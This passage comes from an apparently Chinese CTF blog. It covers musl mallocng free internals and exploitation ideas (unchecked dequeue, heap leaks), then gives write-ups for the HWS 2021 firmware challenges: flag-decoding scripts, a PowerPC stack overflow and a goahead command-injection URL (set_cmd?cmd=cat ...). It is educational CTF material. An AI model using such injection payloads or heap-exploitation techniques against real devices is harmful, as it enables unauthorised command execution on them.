mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>通过<code>get_meta()</code>找到chunk对应的meta，重置idx与offset，将meta的freed_mask中标记一下就算释放完毕了。</li>
<li>有一些特殊情况的，需要跳出循环来调用<code>nontrivial_free()</code>完成相关操作</li>
</ul>

        <h4 id="①nontrivial-free"   >
          <a href="#①nontrivial-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#①nontrivial-free" class="headerlink" title="①nontrivial_free()"></a>①nontrivial_free()</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果meta-group中所有chunk要么被释放要么可使用</span></span><br><span class="line">    <span class="comment">//并且g可以被释放(不是mmap出来的),那么就要回收掉整个meta</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">             <span class="comment">//检查sc释放合法, 不是mmap(63)的</span></span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">            <span class="comment">//如果g是队列中开头的meta, 那么弹出队列后, 要激活后一个</span></span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">//激活后一个meta过程中需要完成avail_mask和free_mask的设置</span></span><br><span class="line">            <span class="comment">//即free_mask向avail_maks进行转移</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//现在要释放这个meta-group,放入ctx.free_meta_head中</span></span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">        </span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">//如果mask==0, 也就是这个meta-group中所有的chunk都被分配出去了</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="comment">//现在这个全部chunk被分配出去的group中有一个chunk要被释放了</span></span><br><span class="line">        <span class="comment">//因此这个meta-group要重新入队</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②dequeue"   >
          <a href="#②dequeue" class="heading-link"><i class="fas fa-link"></i></a><a href="#②dequeue" class="headerlink" title="②dequeue"></a>②dequeue</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//meta的出队操作，一般漏洞点出在这里</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>没有检测meta中的next和prev指针是否合法</p>

        <h2 id="🔺注：-1"   >
          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>malloc和free的时候不会将chunk的内容置空，这个给我们创造了UAF的一些条件，同样的也有相应的静态堆内存</p>

        <h2 id="4-利用方式"   >
          <a href="#4-利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-利用方式" class="headerlink" title="4.利用方式"></a>4.利用方式</h2>
      
        <h3 id="1-泄露地址-1"   >
          <a href="#1-泄露地址-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露地址-1" class="headerlink" title="(1)泄露地址"></a>(1)泄露地址</h3>
      <p>通常使用静态堆内存来进行泄露，但是这里就涉及一个问题，静态堆内存就算申请到了，也没有指针啊。所以现在的题目好多都是申请一个chunk结构体，比如</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> size[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span>* <span class="title">myChunk</span> =</span> <span class="built_in">malloc</span>(xxx); </span><br><span class="line">myChunk.data = <span class="built_in">malloc</span>(xxx);</span><br></pre></td></tr></table></div></figure>

<p>这样在在一定的UAF或者溢出条件下，就可以泄露出data指针，而如果这个data指针恰好是从静态堆内存申请出来的，那么就能泄露libc地址了。</p>
<p>heap地址也是类似，一般就是通过溢出或者UAF之类的来泄露了。</p>
<p>如果没有的话，我能想到的就是无限申请，直到耗尽meta的空间，当它再开辟的meta空间的时候，由于是mmap分配的，那么就有可能申请出libc的空间</p>

        <h3 id="2-getshell-1"   >
          <a href="#2-getshell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell-1" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="①secrect"   >
          <a href="#①secrect" class="heading-link"><i class="fas fa-link"></i></a><a href="#①secrect" class="headerlink" title="①secrect"></a>①secrect</h4>
      <p>由于</p>

        <h4 id="②伪造meta"   >
          <a href="#②伪造meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#②伪造meta" class="headerlink" title="②伪造meta"></a>②伪造meta</h4>
      </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/">2021HWS固件学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-21</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、练习题"   >
          <a href="#一、练习题" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、练习题" class="headerlink" title="一、练习题"></a>一、练习题</h1>
      
        <h2 id="1-SMT32固件"   >
          <a href="#1-SMT32固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMT32固件" class="headerlink" title="1.SMT32固件"></a>1.SMT32固件</h2>
      
        <h3 id="1-IDA分析"   >
          <a href="#1-IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-IDA分析" class="headerlink" title="(1)IDA分析"></a>(1)IDA分析</h3>
      
        <h4 id="①选择架构"   >
          <a href="#①选择架构" class="heading-link"><i class="fas fa-link"></i></a><a href="#①选择架构" class="headerlink" title="①选择架构"></a>①选择架构</h4>
      <p>需要在加载界面选择架构，如图选择ARM小端序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png" alt="image-20220119162036357"></p>

        <h4 id="②设置选项"   >
          <a href="#②设置选项" class="heading-link"><i class="fas fa-link"></i></a><a href="#②设置选项" class="headerlink" title="②设置选项"></a>②设置选项</h4>
      <p>处理器选项设置对应</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png" alt="du"></p>

        <h4 id="③选择固件加载地址"   >
          <a href="#③选择固件加载地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#③选择固件加载地址" class="headerlink" title="③选择固件加载地址"></a>③选择固件加载地址</h4>
      <p>OK之后，进入填写加载地址的界面，修改如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png" alt="image-20220119162333850"></p>
<p>这个对于SMT32这种类型的固件是一定的，需要自己去上网查询，Input file的loading address可以让我们输入其他值，就使得IDA不从头加载，而从我们输入的地址开始加载。</p>

        <h4 id="④寻找函数地址"   >
          <a href="#④寻找函数地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#④寻找函数地址" class="headerlink" title="④寻找函数地址"></a>④寻找函数地址</h4>
      
        <h4 id="A-查找中断处理函数"   >
          <a href="#A-查找中断处理函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-查找中断处理函数" class="headerlink" title="A.查找中断处理函数"></a>A.查找中断处理函数</h4>
      <p>在最开头地址+4的地方保存的是中断处理函数，按d转换数据双击点进去即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png" alt="image-20220119162645572"></p>

        <h4 id="B-识别函数"   >
          <a href="#B-识别函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-识别函数" class="headerlink" title="B.识别函数"></a>B.识别函数</h4>
      <p>发现是奇数地址，那么在奇数地址-1的地方，按c，即可分析出一些函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png" alt="image-20220119162843385"></p>
<p>其中0x08000100即为中断处理函数，相对于SMT32固件而言，该函数的第二次跳转地址上的首次跳转的最后跳转再跳转即为main函数地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png" alt="image-20220119163217387"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png" alt="image-20220119163231426"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png" alt="image-20220119163255655"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png" alt="image-20220119163337683"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png" alt="image-20220119163359036"></p>

        <h3 id="2-解密"   >
          <a href="#2-解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解密" class="headerlink" title="(2)解密"></a>(2)解密</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png" alt="image-20220119163634811"></p>
<p>分析之后，即可找到对应的加密算法，按照上述逻辑恢复即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = [   </span><br><span class="line">        <span class="number">0x7D</span>,<span class="number">0x77</span>,<span class="number">0x40</span>,<span class="number">0x7A</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x2A</span>,<span class="number">0x2F</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x40</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x2C</span>,<span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2B</span>,<span class="number">0x28</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x7C</span>,<span class="number">0x41</span>,<span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0x7E</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2A</span>,<span class="number">0x41</span>,<span class="number">0x7F</span>,<span class="number">0x2F</span>,<span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="built_in">chr</span>((i ^ <span class="number">0x1E</span>) + <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-BlinkBlink-200"   >
          <a href="#2-BlinkBlink-200" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BlinkBlink-200" class="headerlink" title="2.BlinkBlink_200"></a>2.BlinkBlink_200</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink" >HWS2021冬令营选拔赛 | Clang鱼塘 (blingblingxuanxuan.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-固件解包"   >
          <a href="#1-固件解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件解包" class="headerlink" title="(1)固件解包"></a>(1)固件解包</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me uImage</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-当前目录搜索"   >
          <a href="#2-当前目录搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-当前目录搜索" class="headerlink" title="(2)当前目录搜索"></a>(2)当前目录搜索</h3>
      <p>该命令可在当前文件夹下搜索密码，一般这种路由器的密码都是从/etc/passwd中取得</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri &quot;etc/passwd&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png" alt="image-20220119174406881"></p>
<p>排除busybox和libc，那么先去goahead中找，直接拖进IDA32分析</p>
<p>goahead是一个嵌入式的Web服务器：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.embedthis.com/goahead/" >https://www.embedthis.com/goahead/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="①定位字符串"   >
          <a href="#①定位字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#①定位字符串" class="headerlink" title="①定位字符串"></a>①定位字符串</h4>
      <p>搜索字符串<code>set_qos_cfg</code>，这个常用，找到如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png" alt="image-20220119175251051"></p>
<p>漏洞常常在<code>goform</code>接口下，简单查看一下，发现其中有一个<code>set_cmd</code>的引用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png" alt="image-20220119175504033"></p>
<p>进入函数，发现一个设置命令的函数<code>bs_SetCmd</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png" alt="image-20220119175643376"></p>

        <h4 id="②分析函数"   >
          <a href="#②分析函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②分析函数" class="headerlink" title="②分析函数"></a>②分析函数</h4>
      <p>参照上面的函数名称，继续搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png" alt="image-20220119175815328"></p>
<p>发现定位在libshare中，打开分析一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png" alt="image-20220119180323116"></p>
<p>其中off_4F2CC的值为%s，即格式化为字符串输出给v21，那么很明显就是使用<code>popen</code>进行命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png" alt="image-20220119180607832"></p>

        <h4 id="③URL访问"   >
          <a href="#③URL访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#③URL访问" class="headerlink" title="③URL访问"></a>③URL访问</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goform/set_cmd?cmd=cat /home/goahead/flag.txt</span><br></pre></td></tr></table></div></figure>

<p>这里就是调用goform的接口API进行测试即可获得flag</p>

        <h2 id="3-httpd"   >
          <a href="#3-httpd" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-httpd" class="headerlink" title="3.httpd"></a>3.httpd</h2>
      <p>不太会</p>

        <h2 id="4-nodemcu"   >
          <a href="#4-nodemcu" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-nodemcu" class="headerlink" title="4.nodemcu"></a>4.nodemcu</h2>
      <p>直接出</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings nodemcu.bin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png" alt="image-20220120125706243"></p>
<p>看来以后都先strings一把梭试试</p>

        <h2 id="5-easybios"   >
          <a href="#5-easybios" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-easybios" class="headerlink" title="5.easybios"></a>5.easybios</h2>
      
        <h3 id="1-前置探索"   >
          <a href="#1-前置探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置探索" class="headerlink" title="(1)前置探索"></a>(1)前置探索</h3>
      <p>按照命令提示启动，但是有时候可以，有时候又不可以，可能在等一下就可以？</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png" alt="image-20220120130559529">给了提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png" alt="image-20220120130724621"></p>
<p>尝试一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png" alt="image-20220120130702363"></p>

        <h3 id="2-IDA分析"   >
          <a href="#2-IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IDA分析" class="headerlink" title="(2)IDA分析"></a>(2)IDA分析</h3>
      <p>使用binwalk解包</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me easybios</span><br></pre></td></tr></table></div></figure>

<p>然后IDA打开解包出来的二进制文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png" alt="image-20220120143603848"></p>
<p>搜索一下Wrong字符串，没搜到，尝试用unicode格式搜索，即UTF-16LE格式，一个字符两个字节。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png" alt="image-20220120144209024"></p>
<p>然后加上00即可-&gt;<code>57 00 72 00 6F 00 6E 00 67 00</code>，找到两个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png" alt="image-20220120144641985"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png" alt="image-20220120144707349"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png" alt="image-20220120144725574"></p>
<p>很明显应该是下面那个，但是这个文件有点大，不好解析，再加上之前在解包的时候看到包含很多PE文件，所以这个程序应该也是在一个PE文件里，那么我们依据地址，找到对应的PE文件头尾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png" alt="image-20220120150501890"></p>

        <h3 id="3-切割分析"   >
          <a href="#3-切割分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-切割分析" class="headerlink" title="(3)切割分析"></a>(3)切割分析</h3>
      
        <h4 id="①寻找头尾地址"   >
          <a href="#①寻找头尾地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#①寻找头尾地址" class="headerlink" title="①寻找头尾地址"></a>①寻找头尾地址</h4>
      <p>依据地址找到以下头尾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png" alt="image-20220120155301520"></p>

        <h4 id="②使用Winhex进行切割"   >
          <a href="#②使用Winhex进行切割" class="heading-link"><i class="fas fa-link"></i></a><a href="#②使用Winhex进行切割" class="headerlink" title="②使用Winhex进行切割"></a>②使用Winhex进行切割</h4>
      <p>使用Winhex打开，然后找到头尾，使用alt+G搜索地址，选定头尾</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png" alt="image-20220120155739157"></p>
<p>头部</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png" alt="image-20220120155816532"></p>
<p>尾部</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png" alt="image-20220120155907991"></p>
<p>选中选快，右键编辑-&gt;复制选块-&gt;至新文件，然后保存用IDA打开，照常使用全局搜索字符<code>57 00 72 00 6F 00 6E 00 67 00</code>找到对应的函数<code>sub_31D6F</code>，一番判断如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png" alt="image-20220120154940674"></p>
<p>然后顺着逻辑理清楚即可，或者尝试使用angr解题，以下exp参照<code>lxonz师傅</code></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nosec.org/home/detail/4672.html" >2021HWS冬令营线上赛固件安全WriteUp|NOSEC安全讯息平台 - 白帽汇安全研究院</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_bytes_hex</span>(<span class="params">data</span>):</span></span><br><span class="line">    lin = [<span class="string">&#x27;%0x&#x27;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(lin))</span><br><span class="line"></span><br><span class="line">magic = <span class="string">&#x27;OVMF_And_Easy_Bios&#x27;</span></span><br><span class="line">demo = [<span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0xb0</span>, <span class="number">0x27</span>, <span class="number">0x8e</span>, <span class="number">0x8f</span>, <span class="number">0x5b</span>, <span class="number">0xe9</span>, <span class="number">0xd8</span>, <span class="number">0x46</span>, <span class="number">0x9c</span>, <span class="number">0x72</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>]</span><br><span class="line">v13 = [<span class="number">0</span>]*<span class="number">514</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v13[i] = i</span><br><span class="line">    v13[i+<span class="number">256</span>] = <span class="built_in">ord</span>(magic[i%<span class="number">18</span>])</span><br><span class="line"></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">while</span> v2!=<span class="number">256</span>:</span><br><span class="line">    v4 = v13[v2]</span><br><span class="line">    v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span></span><br><span class="line">    v5 = v13[v3]</span><br><span class="line">    v13[v3] = v4</span><br><span class="line">    v13[v2] = v5</span><br><span class="line">    v2+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> v6 != <span class="number">16</span>:</span><br><span class="line">    v8 = v8 + <span class="number">1</span></span><br><span class="line">    v9 = v13[v8]</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v11 = v13[v10]</span><br><span class="line">    v13[v10] = v9</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v13[v8] = v11</span><br><span class="line">    result = v13[(v11 + v13[v10]) % <span class="number">256</span>]</span><br><span class="line">    new_list.append(result)</span><br><span class="line">    <span class="comment">#(v0 + v6) ^= result</span></span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line"><span class="comment">#print len(demo)</span></span><br><span class="line"><span class="comment">#print len(new_list)</span></span><br><span class="line">flag_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag_list.append(new_list[i]^demo[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(new_list[i]^demo[i]))</span><br><span class="line">print_bytes_hex(flag_list)</span><br><span class="line"><span class="comment">#flag&#123;88baec0b5154f859b5851097bb567f5c&#125;</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-PPPPPPC"   >
          <a href="#6-PPPPPPC" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-PPPPPPC" class="headerlink" title="6.PPPPPPC"></a>6.PPPPPPC</h2>
      
        <h3 id="1-调试"   >
          <a href="#1-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-调试" class="headerlink" title="(1)调试"></a>(1)调试</h3>
      <p>powerpc大端架构</p>
<p>调试发现栈溢出，读入0x320，并且变量偏移在0x140，可覆盖$lr寄存器，控制程序流，保护都没开，就尝试ret2shellcode</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png" alt="image-20220120194956344"></p>

        <h3 id="2-泄露地址"   >
          <a href="#2-泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-泄露地址" class="headerlink" title="(2)泄露地址"></a>(2)泄露地址</h3>
      <p>使用题目给的<code>qemu-ppc-static</code>来运行会使得程序打印所有寄存器的值，远程也是这样的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png" alt="image-20220120195324259"></p>
